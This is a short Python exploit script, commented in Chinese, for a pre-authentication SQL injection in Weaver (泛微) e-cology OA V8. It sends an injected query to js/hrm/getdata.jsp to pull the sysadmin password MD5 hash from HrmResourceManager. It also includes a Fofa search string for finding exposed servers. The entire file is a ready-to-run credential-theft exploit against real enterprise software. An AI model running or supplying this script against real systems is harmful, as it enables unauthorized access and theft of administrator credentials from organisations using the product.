# -*- coding: utf-8 -*-
# 泛微OA V8 前台 SQL注入获取管理员 sysadmin MD5的密码值
# Fofa:  app="泛微-协同办公OA"

import sys
import requests
import urllib3
import time

BLUE = '\033[0;36m'
RED = '\x1b[1;91m'
YELLOW = '\033[33m'
VIOLET = '\033[1;94m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
ENDC = '\033[0m'


def now_time():
    return BLUE + time.strftime("[%H:%M:%S] ", time.localtime()) + ENDC


def info():
    return VIOLET + "[INFO] " + ENDC


def error():
    return RED + "[ERROR] " + ENDC


def success():
    return GREEN + "[SUCCESS] " + ENDC


def warning():
    return YELLOW + "[WARNING] " + ENDC


def poc(url):
    target_url = url + "js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%20password%20as%20id%20from%20HrmResourceManager"
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.192 Mobile Safari/537.36"
    }

    try:
        urllib3.disable_warnings()
        res = requests.get(url=target_url, headers=headers, verify=False, timeout=10)
        if res.status_code == 200 and 'html' not in res.text:
            print(now_time() + info() + "存在V8前台SQL注入")
            print(now_time() + success() + f"用户: sysadmin 密码MD5: {res.text.strip()}")
            return 'ok'
        else:
            print(now_time() + warning() + "不存在V8前台SQL注入")
    except Exception as e:
        print(now_time() + error() + "目标存在未知错误！\n", e)


if __name__ == "__main__":
    url = sys.argv[1]
    if url[-1] != '/':
        url += '/'
    poc(url)
